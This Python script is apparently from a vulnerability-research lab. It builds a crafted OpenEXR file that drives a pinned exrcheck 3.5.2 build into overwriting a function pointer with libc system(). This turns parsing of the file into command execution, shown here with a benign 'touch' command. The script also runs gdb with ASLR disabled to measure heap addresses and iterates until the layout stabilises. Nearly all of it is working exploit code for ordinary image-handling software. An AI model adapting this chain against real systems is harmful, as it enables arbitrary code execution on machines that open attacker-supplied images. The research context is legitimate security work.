#!/usr/bin/env python3
"""W202: drive the W197 file-chosen indirect call to `memcpy`, so the
UNMODIFIED pinned 3.5.2 exrcheck executes memcpy(ctxt, chosen_src, 104) and
overwrites ctxt->free_fn (ctxt+96) with libc system().  When attr_destroy()
falls through to its trailing `ctxt->free_fn(attr)` (attributes.c:271), the
consumer runs system(attr), where the first bytes of the fake attribute are a
benign `touch` command.  All pointers, the target, the system address and the
command string are carried in the EXR; gdb only sets breakpoints and turns off
ASLR so the absolute addresses are meaningful.
"""
import re
import struct
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
LAB = HERE.parent
BASE = LAB / "work-w192/baseline.exr"
OUT = LAB / "cases/p202-memcpy-system.exr"
DUMP = HERE / "w195-pre-copy2-dump.bin"
N, U, BYTE = 768, 3072, 0x5A
ATTR_OFF, OPAQUE_OFF, PAYLOAD_OFF = 1152, 1216, 1400
# ASLR off in the debuggee: pinned 3.5.2 exrcheck calls libc memcpy and
# __libc_system at these fixed addresses (resolved once in the wake probe).
TARGET = 0x7FFFF7FEB900  # libc memcpy
SYSTEM = 0x7FFFF7658750  # __libc_system
COMMAND = b"touch /tmp/w202m\x00"
assert len(COMMAND) <= 20
FREE_FN_OFF = 96
COPY_LEN = FREE_FN_OFF + 8


def build(dest, slot_off):
    d = bytearray(DUMP.read_bytes())
    assert len(d) == 2 * N
    attr_addr = dest + ATTR_OFF
    opaque_addr = dest + OPAQUE_OFF
    payload_addr = dest + PAYLOAD_OFF

    d[slot_off:slot_off + 8] = struct.pack("<Q", attr_addr)
    d[ATTR_OFF:ATTR_OFF + len(COMMAND)] = COMMAND
    d[ATTR_OFF + 20:ATTR_OFF + 24] = struct.pack("<I", 31)  # EXR_ATTR_OPAQUE
    d[ATTR_OFF + 24:ATTR_OFF + 32] = struct.pack("<Q", opaque_addr)

    # exr_attr_opaquedata_t: no packed data, chosen memcpy source/length.
    d[OPAQUE_OFF + 0:OPAQUE_OFF + 4] = struct.pack("<i", 0)
    d[OPAQUE_OFF + 4:OPAQUE_OFF + 8] = struct.pack("<i", COPY_LEN)
    d[OPAQUE_OFF + 8:OPAQUE_OFF + 16] = struct.pack("<II", 0, 0)
    d[OPAQUE_OFF + 16:OPAQUE_OFF + 24] = struct.pack("<Q", 0)
    d[OPAQUE_OFF + 24:OPAQUE_OFF + 32] = struct.pack("<Q", payload_addr)
    d[OPAQUE_OFF + 32:OPAQUE_OFF + 48] = bytes(16)
    d[OPAQUE_OFF + 48:OPAQUE_OFF + 56] = struct.pack("<Q", TARGET)

    # Source for memcpy(ctxt, src, 104): only ctxt+96 must change.
    d[PAYLOAD_OFF:PAYLOAD_OFF + FREE_FN_OFF] = bytes(FREE_FN_OFF)
    d[PAYLOAD_OFF + FREE_FN_OFF:PAYLOAD_OFF + COPY_LEN] = struct.pack("<Q", SYSTEM)

    seg1 = bytes(d[0::2] + d[1::2])
    gen = subprocess.run(
        [sys.executable, str(HERE / "make_poc_mixed_full.py"), str(BASE),
         str(OUT), str(N), hex(BYTE), str(U), seg1.hex()],
        cwd=LAB, capture_output=True, text=True, check=True)
    return seg1, gen.stdout


def measure():
    cmd = ["gdb", "-q", "-batch",
           "-ex", "set args -c cases/p202-memcpy-system.exr",
           "-ex", "set disable-randomization on",
           "-ex", "break sort2_4ByteChannels_tiled", "-ex", "run",
           "-ex", 'printf "SINK_OUT=%p\\n", outPtr',
           "-ex", "break attributes.c:305", "-ex", "continue",
           "-ex", 'printf "SLOT0_ADDR=%p\\n", &list->entries[0]',
           "-ex", "quit",
           "./build-vuln-plain/bin/exrcheck"]
    r = subprocess.run(cmd, cwd=LAB, capture_output=True, text=True)
    text = r.stdout + r.stderr
    m1 = re.search(r"SINK_OUT=(0x[0-9a-f]+)", text)
    m2 = re.search(r"SLOT0_ADDR=(0x[0-9a-f]+)", text)
    if not m1 or not m2:
        print(text[-2000:])
        raise SystemExit("no layout measurement")
    dest = int(m1.group(1), 16) + 4 * N
    return dest, int(m2.group(1), 16) - dest


def main():
    dest = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0x555555828090
    slot_off = int(sys.argv[2]) if len(sys.argv) > 2 else 1104
    for i in range(10):
        _, out = build(dest, slot_off)
        actual_dest, actual_slot = measure()
        print(f"iter {i}: dest {dest:#x}/{actual_dest:#x} "
              f"slot {slot_off}/{actual_slot} "
              f"frame={re.search(r'frame=(\d+)', out).group(1)}")
        if actual_dest == dest and actual_slot == slot_off:
            print(f"FIXPOINT dest={dest:#x} slot={slot_off} "
                  f"attr={dest+ATTR_OFF:#x} src={dest+PAYLOAD_OFF:#x} "
                  f"memcpy={TARGET:#x} system={SYSTEM:#x}")
            sha = subprocess.run(["sha256sum", str(OUT)], capture_output=True,
                                 text=True).stdout.split()[0]
            print(f"poc_sha256={sha}")
            return 0
        dest, slot_off = actual_dest, actual_slot
    raise SystemExit("no fixed point in 10 iterations")


if __name__ == "__main__":
    raise SystemExit(main())
